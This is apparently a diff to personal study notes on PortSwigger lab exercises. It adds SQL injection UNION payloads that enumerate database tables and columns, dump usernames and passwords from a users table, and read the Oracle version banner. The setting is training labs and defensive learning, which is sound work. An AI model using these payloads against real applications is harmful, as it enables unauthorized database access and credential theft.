@@ -589,7 +589,7 @@ XSS in [innerText](https://stackoverflow.com/questions/52707031/does-innertext-p
 
 ## SQL Injection
 
-#### [Lab](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns): Lab: SQL injection UNION attack, determining the number of columns returned by the query
+#### [Lab](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns): SQL injection UNION attack, determining the number of columns returned by the query
 
 1. Initial request: `GET /filter?category=Food+%26+Drink`
 2. Guess: `SELECT name, price FROM products WHERE category='[input]'`
@@ -598,4 +598,20 @@ XSS in [innerText](https://stackoverflow.com/questions/52707031/does-innertext-p
     - `/filter?category='+UNION+SELECT+id,name,price+FROM+products--`
 4. Just had to return an additional row containing null values.
 
+#### [Lab](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text): SQL injection UNION attack, finding a column containing text 
 
+- `/filter?category=Corporate+gifts'+UNION+SELECT+price,null,null+FROM+products--`
+- `/filter?category=Corporate+gifts'+UNION+SELECT+1337,table_name,null+FROM+information_schema.tables--`
+- `/filter?category='+UNION+SELECT+null,column_name,null+FROM+information_schema.columns+WHERE+table_name='products'--`
+- `/filter?category='+UNION+SELECT+null,'0tb9ew',null+FROM+products--` :/
+
+#### [Lab](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables): SQL injection UNION attack, retrieving data from other tables
+
+- `/filter?category=Gifts'+ORDER+BY+2--`
+- `/filter?category=Gifts'+union+select+username,password+from+users--`
+
+#### [Lab](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column): SQL injection UNION attack, retrieving multiple values in a single column
+- `/filter?category=Gifts'+union+select+1,username||':'||password+from+users--`
+
+#### [Lab](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle): SQL injection attack, querying the database type and version on Oracle
+- `/filter?category='+union+select+null,banner+FROM+v$version--`
